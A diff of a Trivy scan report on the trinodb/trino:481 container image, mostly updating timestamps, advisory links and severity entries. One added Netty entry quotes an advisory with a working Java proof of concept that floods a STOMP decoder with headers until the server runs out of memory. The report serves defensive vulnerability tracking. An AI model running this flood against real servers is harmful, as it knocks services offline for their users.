@@ -3,8 +3,8 @@
   "Trivy": {
     "Version": "0.72.0"
   },
-  "ReportID": "019f622e-e605-75e0-a15f-410c0fcf7438",
-  "CreatedAt": "2026-07-14T19:51:08.549386317Z",
+  "ReportID": "019f6461-e2da-7487-9211-3df28c7e6605",
+  "CreatedAt": "2026-07-15T06:06:04.50629937Z",
   "ArtifactID": "sha256:52172746d781d048b07f2e5a994b2a9fd502172320b2ec10073c488597f4537f",
   "ArtifactName": "docker.io/trinodb/trino:481",
   "ArtifactType": "container_image",
@@ -38796,7 +38796,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54513",
@@ -38860,7 +38860,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -41163,6 +41163,49 @@
           "LastModifiedDate": "2026-06-17T10:48:05.893Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-44891",
+          "VendorIDs": [
+            "GHSA-vhch-2wf3-m8rp"
+          ],
+          "PkgName": "io.netty:netty-codec-stomp",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-stomp-4.2.12.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-stomp@4.2.12.Final",
+            "UID": "8500571380be04e2"
+          },
+          "InstalledVersion": "4.2.12.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:16b985be887895ce531029762a01855886a622eb4f6b9326b42faa5628df5f22",
+            "DiffID": "sha256:ac7eb858fbf235947c45d780964ad0daa0d4fc09b7749344106b48b3968fdfd4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44891",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:c9846fb32f1012ed1d7344a6f1db6d702cdde55a7a749daaa40f11d0dbcee190",
+          "Title": "Netty: Denial of Service via Unbounded Headers in StompSubframeDecoder",
+          "Description": "### Summary\nThe StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.\n\n### Details\n`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.\n\n### PoC\nRun the server with `-Xmx256m`\n\n```java\npublic final class ServerApp {\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            ChannelFuture serverFuture = new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new StompSubframeDecoder())\n                    .bind(8080)\n                    .sync();\n            serverFuture.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```\n\n```java\npublic final class ClientApp {\n    public static void main(String[] args) throws Exception {\n        try (Socket socket = new Socket(\"127.0.0.1\", 8080)) {\n            OutputStream out = socket.getOutputStream();\n\n            out.write(\"CONNECT\\n\".getBytes(StandardCharsets.UTF_8));\n\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i \u003c 1000; i++) {\n                sb.append(\"a:1\\n\");\n            }\n            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);\n\n            for (int i = 1; i \u003c= 50_000; i++) {\n                out.write(bulkHeaders);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### Impact\nDenial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
+          ]
+        },
+        {
           "VulnerabilityID": "CVE-2026-44249",
           "VendorIDs": [
             "GHSA-3qp7-7mw8-wx86"
@@ -43025,7 +43068,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-07-09T13:17:29.703Z"
+          "LastModifiedDate": "2026-07-14T12:17:12.863Z"
         },
         {
           "VulnerabilityID": "CVE-2026-54514",
@@ -43512,6 +43555,40 @@
           "LastModifiedDate": "2026-06-17T10:42:38.62Z"
         },
         {
+          "VulnerabilityID": "CVE-2026-56852",
+          "VendorIDs": [
+            "GO-2026-5970"
+          ],
+          "PkgID": "golang.org/x/text@v0.33.0",
+          "PkgName": "golang.org/x/text",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/golang.org/x/text@v0.33.0",
+            "UID": "defbc590be7fb7b0"
+          },
+          "InstalledVersion": "v0.33.0",
+          "FixedVersion": "0.39.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a69ae91f92331bf6ca9702e0df79dbbaec4bd64932456c755277afdcd7a25766",
+            "DiffID": "sha256:13c3cde552da0c6bb15ebdc75ea8e26360985f7042b1a70bd321ecbad16861ad"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56852",
+          "DataSource": {
+            "ID": "govulndb",
+            "Name": "The Go Vulnerability Database",
+            "URL": "https://pkg.go.dev/vuln/"
+          },
+          "Fingerprint": "sha256:8ee50f4d4c5246d819f8ea88da85b00300c552241637c21111d1decd9ad6f6e9",
+          "Title": "Infinite loop on invalid input in golang.org/x/text",
+          "Description": "A norm.Iter can enter an infinite loop when handling input containing invalid UTF-8 bytes.",
+          "Severity": "UNKNOWN",
+          "References": [
+            "https://go.dev/cl/794100",
+            "https://go.dev/issue/80142",
+            "https://pkg.go.dev/vuln/GO-2026-5970"
+          ]
+        },
+        {
           "VulnerabilityID": "CVE-2026-27145",
           "VendorIDs": [
             "GO-2026-5037"
@@ -43569,15 +43646,17 @@
             "https://access.redhat.com/errata/RHSA-2026:36317",
             "https://access.redhat.com/errata/RHSA-2026:36648",
             "https://access.redhat.com/errata/RHSA-2026:36797",
+            "https://access.redhat.com/errata/RHSA-2026:38995",
+            "https://access.redhat.com/errata/RHSA-2026:39005",
             "https://access.redhat.com/security/cve/CVE-2026-27145",
             "https://bugzilla.redhat.com/2445356",
             "https://bugzilla.redhat.com/2484207",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2445356",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2467822",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2484207",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811",
             "https://errata.almalinux.org/9/ALSA-2026-36317.html",
-            "https://errata.rockylinux.org/RLSA-2026:36317",
+            "https://errata.rockylinux.org/RLSA-2026:35832",
             "https://go.dev/cl/783621",
             "https://go.dev/issue/79694",
             "https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw",
@@ -43589,7 +43668,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-27145"
           ],
           "PublishedDate": "2026-06-02T23:16:35.57Z",
-          "LastModifiedDate": "2026-07-09T13:16:54.55Z"
+          "LastModifiedDate": "2026-07-14T12:16:57.193Z"
         },
         {
           "VulnerabilityID": "CVE-2026-33811",
@@ -43676,9 +43755,13 @@
             "https://access.redhat.com/security/cve/CVE-2026-33811",
             "https://bugzilla.redhat.com/2467822",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2467822",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2480680",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2493620",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231",
             "https://errata.almalinux.org/9/ALSA-2026-36617.html",
-            "https://errata.rockylinux.org/RLSA-2026:36617",
+            "https://errata.rockylinux.org/RLSA-2026:38504",
             "https://go.dev/cl/767860",
             "https://go.dev/issue/78803",
             "https://groups.google.com/g/golang-announce/c/qcCIEXso47M",
@@ -43690,7 +43773,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-33811"
           ],
           "PublishedDate": "2026-05-07T20:16:42.77Z",
-          "LastModifiedDate": "2026-07-13T13:16:33.713Z"
+          "LastModifiedDate": "2026-07-14T12:16:59.567Z"
         },
         {
           "VulnerabilityID": "CVE-2026-33814",
@@ -43860,7 +43943,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-39820"
           ],
           "PublishedDate": "2026-05-07T20:16:43.187Z",
-          "LastModifiedDate": "2026-07-10T12:16:44.017Z"
+          "LastModifiedDate": "2026-07-14T12:17:01.753Z"
         },
         {
           "VulnerabilityID": "CVE-2026-39822",
@@ -43895,25 +43978,34 @@
           ],
           "VendorSeverity": {
             "alma": 3,
+            "bitnami": 3,
             "oracle-oval": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
+            },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
               "V3Score": 7.8
             }
           },
           "References": [
-            "https://access.redhat.com/errata/RHSA-2026:37435",
+            "https://access.redhat.com/errata/RHSA-2026:38878",
             "https://access.redhat.com/security/cve/CVE-2026-39822",
-            "https://bugzilla.redhat.com/2480756",
-            "https://errata.almalinux.org/9/ALSA-2026-37435.html",
+            "https://bugzilla.redhat.com/2498152",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2498152",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822",
+            "https://errata.almalinux.org/9/ALSA-2026-38878.html",
+            "https://errata.rockylinux.org/RLSA-2026:38495",
             "https://go.dev/cl/797880",
             "https://go.dev/issue/79005",
             "https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc",
             "https://linux.oracle.com/cve/CVE-2026-39822.html",
-            "https://linux.oracle.com/errata/ELSA-2026-37435.html",
+            "https://linux.oracle.com/errata/ELSA-2026-38878.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-39822",
             "https://pkg.go.dev/vuln/GO-2026-4970",
             "https://www.cve.org/CVERecord?id=CVE-2026-39822"
@@ -44053,7 +44145,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-42499"
           ],
           "PublishedDate": "2026-05-07T20:16:44.54Z",
-          "LastModifiedDate": "2026-07-10T12:16:52.94Z"
+          "LastModifiedDate": "2026-07-14T12:17:05.91Z"
         },
         {
           "VulnerabilityID": "CVE-2026-42504",
@@ -44329,9 +44421,14 @@
             "CWE-201"
           ],
           "VendorSeverity": {
+            "bitnami": 2,
             "redhat": 2
           },
           "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 5.3
+            },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
               "V3Score": 5.3
@@ -44400,11 +44497,9 @@
             "https://access.redhat.com/security/cve/CVE-2026-42507",
             "https://bugzilla.redhat.com/2484205",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2484205",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2484207",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507",
             "https://errata.almalinux.org/9/ALSA-2026-29981.html",
-            "https://errata.rockylinux.org/RLSA-2026:29981",
+            "https://errata.rockylinux.org/RLSA-2026:29980",
             "https://go.dev/cl/777060",
             "https://go.dev/issue/79346",
             "https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw",
